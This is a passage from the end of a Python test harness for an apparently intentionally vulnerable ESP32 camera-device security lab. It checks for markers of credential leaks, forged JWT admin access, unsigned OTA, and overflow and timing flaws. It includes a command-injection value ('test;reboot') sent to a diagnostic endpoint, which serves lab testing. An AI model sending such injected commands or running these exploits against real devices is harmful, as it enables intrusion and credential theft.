    _report_http(1,  "UART leak PIN matches NVS", test_http_uart_leak_matches_nvs)
    _report_http(2,  "I2C leak PIN matches NVS", test_http_i2c_leak_matches_nvs)
    _report_http(3,  "SPI debug leak PIN matches NVS", test_http_spi_debug_leak_matches_nvs)
    _report_http(5,  "Dump reveals jwtSecret=secret123", test_http_l05_dump_secret_value)
    _report_http(9, "Traversal leak admin_pin matches NVS", test_http_path_traversal_matches_nvs)
    _report_http(10, "admin_mode true in /admin/status (forged token)", test_http_admin_status_mode)
    _report_http(15, "Config shows 6-digit User/Admin PINs", test_http_config_pins_format)
    _report_http(16, "Camera frame debug shows previous frame bytes", test_http_camleak_hex_regions)
    _report_http(21, "BLE GATT credential leak", test_http_l20_ble_credential_leak)
    _report_http(26, "USB memory leak pattern present (DE AD BE EF)", test_http_usb_memleak_pattern)
    _report_http(29, "Shared key is secret123", test_http_l26_shared_key_value)
    _report_http(0,  "Admin NVS JSON leaks PINs", test_http_admin_nvs_leak_json)
    _report_http(4,  "Bootloader read marker", test_http_l04_bootloader_marker)
    _report_http(6,  "PIN check patched bypass marker", test_http_l06_patch_bypass_marker)
    _report_http(7,  "Unsigned OTA accepted marker", test_http_l07_unsigned_ota_marker)
    _report_http(8,  "Command injection markers present", test_http_l09_injection_marker)
    # L12 moved to destructive section (crashes device, requires power cycle)
    _report_http(18, "I2C spoofing applied marker", test_http_l16_i2c_spoof_marker)
    _report_http(19, "DMA overflow occurred marker", test_http_l17_dma_overflow_marker)
    _report_http(20, "BLE GATT overflow leaked secret marker", test_http_l19_ble_gatt_overflow_marker)
    _report_http(22, "WiFi OTA over HTTP (no TLS) marker", test_http_l21_ota_no_tls_marker)
    _report_http(23, "WiFi PMF disabled marker", test_http_l25_wifi_deauth_marker)
    _report_http(24, "mDNS auth absent marker", test_http_l26_mdns_marker)
    _report_http(25, "Serial DFU unsigned accepted marker", test_http_l22_dfu_unsigned_marker)
    _report_http(27, "TOCTOU auth bypass marker", test_http_l24_usb_auth_race_marker)
    _report_http(28, "Weak RNG token_seq format plausible", test_http_l25_rng_sequence_format)
    _report_http(30, "PIN timing side-channel marker", test_http_l27_timing_marker)
    _report_http(31, "Cache timing leak marker", test_http_l28_cache_timing_marker)
    _report_http(32, "SCA AES target marker", test_http_l29_sca_aes_target_marker)
    _report_http(33, "Power glitch / bus contention marker", test_http_l30_glitch_marker)
    _report_http(34, "Secure boot disabled marker", test_http_l36_secureboot_marker)
    _report_http(35, "Flash encryption disabled marker", test_http_l37_flashcrypt_marker)


    # Exploit-level validation: actually exercise the vulnerability
    print_header("Exploit-Level Validation")
    _report_http(7,  "L07 OTA accepts unsigned firmware URL", test_exploit_l07_ota_accepts_unsigned)
    _report_http(9,  "L09 path traversal leaks user database", test_exploit_l09_traversal_users)
    _report_http(10, "L10 forged JWT grants /admin/nvs access", test_exploit_l10_forged_jwt_admin_nvs)
    _report_http(12, "L12 format string payload accepted", test_exploit_l12_format_string_leak)
    _report_http(13, "L13 heap overflow overwrites auth token", test_exploit_l13_heap_overflow_token)
    _report_http(14, "L14 CSRF: no Origin header validation", test_exploit_l14_csrf_no_origin_check)
    _report_http(15, "L15 broken access control /config vs /settings", test_exploit_l15_broken_access_control)
    _report_http(17, "L17 stream auth bypass via ?noauth=1", test_exploit_l17_stream_auth_bypass)
    _report_http(28, "L28 weak RNG: deterministic tokens", test_exploit_l28_rng_deterministic)
    _report_http(29, "L29 key reuse: one JWT across all endpoints", test_exploit_l29_key_reuse_multi_endpoint)
    _report_http(30, "L30 timing attack: measurable PIN side-channel", test_exploit_l30_timing_measurable)

    # HTTP /diag (All labs via hook)
    print_header("HTTP /diag (All labs)")

    if not _testlab_available() and os.environ.get("REQUIRE_TEST_LAB") != "1":
        print_test(0, "All /diag hooks", "SKIP",
                   "/diag endpoint not present; flash M5CoreS3_debug (DEV_TEST_HOOKS) to run harness-only checks")
    else:

        def _report_testlab_case(lab_id, name, params, expects):
            if not _ensure_device_up():
                print_test(lab_id, name, "SKIP", "Device not reachable after recovery attempt")
                return
            p = {"id": lab_id}
            p.update(params or {})
            ok, status, headers, body = _http_get("/diag", params=p, timeout=2)
            text = (body or b"").decode(errors="ignore")
            if not ok or status != 200:
                if os.environ.get("REQUIRE_TEST_LAB") == "1":
                    print_test(lab_id, name, "FAIL", f"/diag?id={lab_id} failed (status={status})")
                else:
                    print_test(lab_id, name, "SKIP", f"/diag?id={lab_id} unavailable (status={status}); skipping harness-only hook")
                return
            missing = [e for e in expects if e not in text]
            if missing:
                print_test(lab_id, name, "FAIL", f"Missing markers: {missing}")
            else:
                print_test(lab_id, name, "PASS", "OK")

        cases = [
            (1,  "UART Secrets Leak (hook)",              {}, ["UART LOG: Admin PIN:"]),
            (2,  "I2C Sniffing (hook)",                   {}, ["I2C test pattern written: admin_pin="]),
            (3,  "SPI Flash Debug Read (hook)",           {}, ["flash_read allowed; admin_pin="]),
            (4,  "Bootloader Read (hook)",                {}, ["UART download mode allowed"]),
            (5,  "Firmware Dump (hook)",                  {}, ["Firmware dump contains jwtSecret="]),
            (6,  "Binary Patch & Reflash (hook)",         {}, ["PIN check patched bypass"]),
            (7,  "Unsigned OTA (hook)",                   {}, ["Unsigned OTA accepted"]),
            (9,  "Command Injection (hook)",              {"p1": "test;reboot"}, ["[DEBUG] Command injection detected!", "Constructed command:"]),
            (10, "Path Traversal (hook)",                 {}, ["admin_pin="]),
            (11, "Weak JWT (hook)",                       {}, ["Forged JWT: "]),
            # L12 doesn't output markers - exploit is verified via /admin access change
            (13, "Unauth Config (hook)",                  {}, ["Device Configuration", "No authentication required"]),
            (14, "Camera Buffer Leak (hook)",             {}, ["Previous frame bytes visible after preview region."]),
            (15, "MJPEG No Auth (hook)",                  {}, ["MJPEG Stream", "noauth=1"]),
            (16, "I2C Secure Element (hook)",              {}, ["I2C Secure Element Diagnostics"]),
            (17, "SPI DMA Overflow (hook)",               {}, ["SPI DMA Diagnostics"]),
            (19, "BLE GATT Overflow (hook)",              {}, ["BLE GATT", "ble_config_unlock"]),
            (20, "BLE Credential Leak (hook)",             {}, ["Credential Exposure", "user_pin"]),
            (21, "WiFi Rogue OTA (hook)",                 {}, ["OTA", "HTTP"]),
            (22, "Serial Firmware Update (hook)",          {}, ["download mode", "esptool"]),
            (23, "Uninit Memory Leak (hook)",             {}, ["Memory Leak", "UNINITIALIZED"]),
            (24, "TOCTOU Auth Bypass (hook)",             {}, ["TOCTOU", "Race Condition"]),
            (25, "Weak RNG (hook)",                        {}, ["token_seq:"]),
            (26, "Key Reuse (hook)",                      {}, ["Shared key:"]),
            (27, "Timing Attack on PIN (hook)",           {}, ["Timing", "early exit"]),
            (28, "Cache Timing Leak (hook)",              {}, ["timing_leak: yes"]),
            (29, "SCA AES Target (hook)",                 {}, ["AES-128 CPA target"]),
            (30, "Power Glitch / Bus Contention (hook)",  {}, ["Glitch bypass succeeded"]),
            (31, "Forensic Recovery (hook)",              {}, ["Recovered JPEG EXIF"]),
            (33, "Format String (hook)",                  {}, ["format_string_vuln: present"]),
            (34, "Heap Overflow (hook)",                  {}, ["Heap Buffer Overflow", "heap_overflow: safe"]),  # Safe: no overflow payload (destructive test sends p1=AAA...)
            (35, "CSRF Protection (hook)",                {}, ["csrf_protection: none"]),
            (36, "WiFi Deauth (hook)",                    {}, ["wifi_pmf: disabled"]),
            (37, "mDNS Spoofing (hook)",                  {}, ["mdns_auth: none"]),
            (38, "Secure Boot Analysis (hook)",           {}, ["secure_boot: disabled"]),
            (39, "Flash Encryption Analysis (hook)",      {}, ["flash_encryption: disabled"]),
        ]

        for lab_id, name, params, expects in cases:
            _report_testlab_case(lab_id, name, params, expects)


    if os.environ.get("SKIP_PIO_TESTS") == "1":
        print_test(0, "Device Unity Tests (All Labs)", "SKIP", "Skipped by SKIP_PIO_TESTS=1")
    else:
        success, message = run_device_unity_tests()
        print_test(0, "Device Unity Tests (All Labs)", "PASS" if success else "FAIL", message)

    # Crash-inducing tests run LAST (device reset via esptool after each crash)
    # L08/L11/L13 crash-inducing tests: verified via safe diag hooks above
    # (diag 9 = injection markers, diag 12 = /camera endpoint, diag 34 = heap safe marker).
    # Live exploit tests (test_http_l09_command_injection_live_reboot,
    # test_http_testlab_overflow, test_http_l14_heap_overflow_marker) crash the
    # device and require esptool reset + ARP recovery (~2 min each).
    # Run them manually with: CORES3_DESTRUCTIVE=1
    if os.environ.get("CORES3_DESTRUCTIVE") == "1":
        print_header("Crash-Inducing Tests (CORES3_DESTRUCTIVE=1)")
        _report_http(8,  "L08 command injection triggers reboot", test_http_l09_command_injection_live_reboot)
        _report_http(11, "L11 buffer overflow via /camera", test_http_testlab_overflow)
        _report_http(13, "L13 heap overflow via /diag", test_http_l14_heap_overflow_marker)
    else:
        # Safe versions: verify vulnerable code paths exist without crashing.
        # L08 /apply is last because it triggers WiFi reconfiguration, briefly
        # dropping the AP connection.
        print_header("Exploit Verification (safe --no device crash)")
        _report_http(11, "L11 /camera accepts exposure param (overflow vector)", test_http_l12_camera_accepts_exposure)
        _report_http(13, "L13 heap overflow diag (safe input)", test_http_l14_heap_overflow_safe)
        _report_http(8,  "L08 /apply accepts SSID field (injection vector)", test_http_l09_apply_accepts_ssid)

    # Summary
    print_header("Test Summary")
    total = tests_passed + tests_failed + tests_skipped
    print(f"Total tests: {total}")
    print(f"  Passed:  {tests_passed}")
    print(f"  Failed:  {tests_failed}")
    print(f"  Skipped: {tests_skipped}")

    if tests_failed > 0:
        print("\n\033[91mSome tests failed!\033[0m")
        return 1
    else:
        print("\n\033[92mAll tests passed!\033[0m")
        return 0

if __name__ == "__main__":
    sys.exit(main())

